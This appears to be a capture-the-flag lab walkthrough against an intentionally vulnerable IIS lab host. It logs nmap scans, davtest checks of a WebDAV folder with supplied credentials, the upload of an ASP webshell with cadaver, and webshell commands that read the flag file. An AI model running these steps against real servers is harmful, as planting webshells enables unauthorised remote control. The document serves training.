@@ -1,0 +1,211 @@
+target: demo.ine.local
+credentials: | Username | Password | | bob | password_123321 |
+
+Step 1:
+┌──(root㉿INE)-[~]
+└─# nmap -sS -Pn -A -T5 demo.ine.local 
+  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-30 20:42 IST
+  Nmap scan report for demo.ine.local (10.4.29.98)
+  Host is up (0.0089s latency).
+  Not shown: 994 closed tcp ports (reset)
+  PORT     STATE SERVICE       VERSION
+  80/tcp   open  http          Microsoft IIS httpd 10.0
+  | http-methods: 
+  |_  Potentially risky methods: TRACE COPY PROPFIND LOCK UNLOCK PROPPATCH MKCOL PUT DELETE MOVE
+  |_http-server-header: Microsoft-IIS/10.0
+  |_http-title: Did not follow redirect to /Default.aspx
+  | http-webdav-scan: 
+  |   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, LOCK, UNLOCK
+  |   Server Date: Wed, 30 Apr 2025 15:12:21 GMT
+  |   Server Type: Microsoft-IIS/10.0
+  |   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
+  |_  WebDAV type: Unknown
+  135/tcp  open  msrpc         Microsoft Windows RPC
+  139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+  445/tcp  open  microsoft-ds?
+  3306/tcp open  mysql         MySQL (unauthorized)
+  3389/tcp open  ms-wbt-server Microsoft Terminal Services
+  |_ssl-date: 2025-04-30T15:12:29+00:00; 0s from scanner time.
+  | ssl-cert: Subject: commonName=DotNetGoat
+  | Not valid before: 2025-04-29T15:09:57
+  |_Not valid after:  2025-10-29T15:09:57
+  | rdp-ntlm-info: 
+  |   Target_Name: DOTNETGOAT
+  |   NetBIOS_Domain_Name: DOTNETGOAT
+  |   NetBIOS_Computer_Name: DOTNETGOAT
+  |   DNS_Domain_Name: DotNetGoat
+  |   DNS_Computer_Name: DotNetGoat
+  |   Product_Version: 10.0.17763
+  |_  System_Time: 2025-04-30T15:12:21+00:00
+  Device type: general purpose
+  Running (JUST GUESSING): Microsoft Windows 2019|10|Vista|2012|Longhorn|2016|7|8.1|11|2008 (95%)
+  OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_7:::ultimate cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_server_2008::sp2
+  Aggressive OS guesses: Microsoft Windows Server 2019 (95%), Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Server 2012 (92%), Microsoft Windows Longhorn (91%), Microsoft Windows 10 2004 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (91%), Microsoft Windows 7 SP1 (91%)
+  No exact OS matches for host (test conditions non-ideal).
+  Network Distance: 3 hops
+  Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+  
+  Host script results:
+  | smb2-time: 
+  |   date: 2025-04-30T15:12:24
+  |_  start_date: N/A
+  | smb2-security-mode: 
+  |   3:1:1: 
+  |_    Message signing enabled but not required
+  
+  TRACEROUTE (using port 1025/tcp)
+  HOP RTT     ADDRESS
+  1   0.05 ms us-east-9 (10.10.42.1)
+  2   ...
+  3   9.55 ms demo.ine.local (10.4.29.98)
+  
+  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+  Nmap done: 1 IP address (1 host up) scanned in 29.51 seconds
+
+┌──(root㉿INE)-[~]
+└─# nmap -p 80 --script http-enum -sV demo.ine.local
+  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-30 20:46 IST
+  Nmap scan report for demo.ine.local (10.4.29.98)
+  Host is up (0.0087s latency).
+  
+  PORT   STATE SERVICE VERSION
+  80/tcp open  http    Microsoft IIS httpd 10.0
+  |_http-server-header: Microsoft-IIS/10.0
+  | http-enum: 
+  |_  /webdav/: Potentially interesting folder (401 Unauthorized)
+  Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+  
+  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+  Nmap done: 1 IP address (1 host up) scanned in 31.95 seconds
+
+Step 2:
+┌──(root㉿INE)-[~]
+└─# davtest -auth bob:password_123321 -url http://demo.ine.local/webdav/
+  ********************************************************
+   Testing DAV connection
+  OPEN            SUCCEED:                http://demo.ine.local/webdav
+  ********************************************************
+  NOTE    Random string for this session: hAq6eZ9ze
+  ********************************************************
+   Creating directory
+  MKCOL           SUCCEED:                Created http://demo.ine.local/webdav/DavTestDir_hAq6eZ9ze
+  ********************************************************
+   Sending test files
+  PUT     txt     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_hAq6eZ9ze/davtest_hAq6eZ9ze.txt
+  PUT     aspx    SUCCEED:        http://demo.ine.local/webdav/DavTestDir_hAq6eZ9ze/davtest_hAq6eZ9ze.aspx
+  PUT     php     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_hAq6eZ9ze/davtest_hAq6eZ9ze.php
+  PUT     pl      SUCCEED:        http://demo.ine.local/webdav/DavTestDir_hAq6eZ9ze/davtest_hAq6eZ9ze.pl
+  PUT     asp     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_hAq6eZ9ze/davtest_hAq6eZ9ze.asp
+  PUT     html    SUCCEED:        http://demo.ine.local/webdav/DavTestDir_hAq6eZ9ze/davtest_hAq6eZ9ze.html
+  PUT     jhtml   SUCCEED:        http://demo.ine.local/webdav/DavTestDir_hAq6eZ9ze/davtest_hAq6eZ9ze.jhtml
+  PUT     shtml   SUCCEED:        http://demo.ine.local/webdav/DavTestDir_hAq6eZ9ze/davtest_hAq6eZ9ze.shtml
+  PUT     cfm     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_hAq6eZ9ze/davtest_hAq6eZ9ze.cfm
+  PUT     jsp     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_hAq6eZ9ze/davtest_hAq6eZ9ze.jsp
+  PUT     cgi     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_hAq6eZ9ze/davtest_hAq6eZ9ze.cgi
+  ********************************************************
+   Checking for test file execution
+  EXEC    txt     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_hAq6eZ9ze/davtest_hAq6eZ9ze.txt
+  EXEC    txt     FAIL
+  EXEC    aspx    FAIL
+  EXEC    php     FAIL
+  EXEC    pl      FAIL
+  EXEC    asp     SUCCEED:        http://demo.ine.local/webdav/DavTestDir_hAq6eZ9ze/davtest_hAq6eZ9ze.asp
+  EXEC    asp     FAIL
+  EXEC    html    SUCCEED:        http://demo.ine.local/webdav/DavTestDir_hAq6eZ9ze/davtest_hAq6eZ9ze.html
+  EXEC    html    FAIL
+  EXEC    jhtml   FAIL
+  EXEC    shtml   FAIL
+  EXEC    cfm     FAIL
+  EXEC    jsp     FAIL
+  EXEC    cgi     FAIL
+  
+  ********************************************************
+  /usr/bin/davtest Summary:
+  Created: http://demo.ine.local/webdav/DavTestDir_hAq6eZ9ze
+  PUT File: http://demo.ine.local/webdav/DavTestDir_hAq6eZ9ze/davtest_hAq6eZ9ze.txt
+  PUT File: http://demo.ine.local/webdav/DavTestDir_hAq6eZ9ze/davtest_hAq6eZ9ze.aspx
+  PUT File: http://demo.ine.local/webdav/DavTestDir_hAq6eZ9ze/davtest_hAq6eZ9ze.php
+  PUT File: http://demo.ine.local/webdav/DavTestDir_hAq6eZ9ze/davtest_hAq6eZ9ze.pl
+  PUT File: http://demo.ine.local/webdav/DavTestDir_hAq6eZ9ze/davtest_hAq6eZ9ze.asp
+  PUT File: http://demo.ine.local/webdav/DavTestDir_hAq6eZ9ze/davtest_hAq6eZ9ze.html
+  PUT File: http://demo.ine.local/webdav/DavTestDir_hAq6eZ9ze/davtest_hAq6eZ9ze.jhtml
+  PUT File: http://demo.ine.local/webdav/DavTestDir_hAq6eZ9ze/davtest_hAq6eZ9ze.shtml
+  PUT File: http://demo.ine.local/webdav/DavTestDir_hAq6eZ9ze/davtest_hAq6eZ9ze.cfm
+  PUT File: http://demo.ine.local/webdav/DavTestDir_hAq6eZ9ze/davtest_hAq6eZ9ze.jsp
+  PUT File: http://demo.ine.local/webdav/DavTestDir_hAq6eZ9ze/davtest_hAq6eZ9ze.cgi
+  Executes: http://demo.ine.local/webdav/DavTestDir_hAq6eZ9ze/davtest_hAq6eZ9ze.txt
+  Executes: http://demo.ine.local/webdav/DavTestDir_hAq6eZ9ze/davtest_hAq6eZ9ze.asp
+  Executes: http://demo.ine.local/webdav/DavTestDir_hAq6eZ9ze/davtest_hAq6eZ9ze.html
+
+Step 3:
+┌──(root㉿INE)-[~]
+└─# cadaver http://demo.ine.local/webdav/
+  Authentication required for demo.ine.local on server `demo.ine.local':
+  Username: bob
+  Password: 
+dav:/webdav/> ls
+  Listing collection `/webdav/': succeeded.
+  Coll:   DavTestDir_hAq6eZ9ze                   0  Apr 30 20:48
+          AttackDefense.txt                     13  Jan  2  2021
+          web.config                           168  Jan  2  2021
+dav:/webdav/> put /usr/share/webshells/asp/webshell.asp 
+  Uploading /usr/share/webshells/asp/webshell.asp to `/webdav/webshell.asp':
+  Progress: [=============================>] 100.0% of 1362 bytes succeeded.
+dav:/webdav/> ls
+  Listing collection `/webdav/': succeeded.
+  Coll:   DavTestDir_hAq6eZ9ze                   0  Apr 30 20:48
+          AttackDefense.txt                     13  Jan  2  2021
+          web.config                           168  Jan  2  2021
+          webshell.asp                        1362  Apr 30 20:51
+
+Step 4:
+dir C\:
+  \\DOTNETGOAT\bobdemo.ine.local
+  
+  
+  The server's port:
+  80
+  
+  
+  The server's software:
+  Microsoft-IIS/10.0
+  
+  
+  The server's local address:
+  10.4.29.98 Volume in drive C has no label.
+   Volume Serial Number is 9E32-0E96
+  
+   Directory of C:\
+  
+  11/14/2018  06:56 AM    
+            EFI
+  01/02/2021  01:01 PM                32 flag.txt
+  10/27/2020  06:45 AM    
+            inetpub
+  05/13/2020  05:58 PM    
+            PerfLogs
+  10/27/2020  02:18 PM    
+            Program Files
+  10/27/2020  02:18 PM    
+            Program Files (x86)
+  10/27/2020  02:21 PM    
+            Users
+  10/27/2020  06:46 AM    
+            Windows
+                 1 File(s)             32 bytes
+                 7 Dir(s)  16,255,193,088 bytes free
+
+type C:\flag.txt
+  \\DOTNETGOAT\bobdemo.ine.local
+
+
+  The server's port:
+  80
+  
+  
+  The server's software:
+  Microsoft-IIS/10.0
+  
+  
+  The server's local address:
+  10.4.29.980cc175b9c0f1b6a831c399e269772661
